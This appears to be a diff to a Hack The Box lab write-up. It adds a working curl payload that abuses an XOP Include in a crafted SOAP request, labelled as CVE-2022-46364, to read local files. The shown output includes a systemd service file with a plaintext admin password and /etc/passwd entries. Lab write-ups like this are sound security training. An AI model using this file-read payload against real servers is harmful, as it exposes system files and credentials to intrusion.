@@ -119,8 +119,7 @@ local: employee-service.jar remote: employee-service.jar
 6445030 bytes received in 00:15 (394.04 KiB/s)
 ```
 
-
-
+Found LFI via CVE-2022-46364:
 
 ```
 ajdev@rootbox:~/HTB/DevArea$ curl -s http://devarea.htb:8080/employeeservice \
@@ -166,3 +165,31 @@ postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
 _laurel:x:999:987::/var/log/laurel:/bin/false
 dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
 ```
+
+```
+ajdev@rootbox:~/HTB/DevArea$ curl -s http://devarea.htb:8080/employeeservice \
+-H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
+--data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n  <soap:Body>\r\n    <ns2:submitReport xmlns:ns2="http://devarea.htb/">\r\n      <arg0>\r\n        <confidential>true</confidential>\r\n        <content><inc:Include href="file:///etc/systemd/system/hoverfly.service" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></content>\r\n        <department>test</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </ns2:submitReport>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n--MIMEBoundary--' \
+| grep -oP '(?<=Content: ).*(?=</return>)' | base64 -d
+[Unit]
+Description=HoverFly service
+After=network.target
+
+[Service]
+User=dev_ryan
+Group=dev_ryan
+WorkingDirectory=/opt/HoverFly
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+
+Restart=on-failure
+RestartSec=5
+StartLimitIntervalSec=60
+StartLimitBurst=5
+LimitNOFILE=65536
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+```
+
